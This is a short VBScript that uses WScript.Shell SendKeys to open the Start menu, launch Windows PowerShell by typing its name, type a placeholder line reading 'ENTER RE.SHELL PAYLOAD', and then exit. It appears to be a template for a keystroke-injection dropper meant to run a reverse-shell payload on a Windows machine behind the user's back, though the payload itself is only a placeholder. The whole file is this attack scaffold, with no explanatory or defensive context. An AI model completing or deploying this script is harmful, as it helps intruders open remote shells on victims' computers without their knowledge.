set x=createobject("wscript.shell")

x.sendkeys "^" + "{ESC}"
wscript.sleep 1000
x.sendkeys "windows powershell"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 2000
x.sendkeys "ENTER RE.SHELL PAYLOAD" 
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 2000
x.sendkeys "exit"
wscript.sleep 500
x.sendkeys "{ENTER}"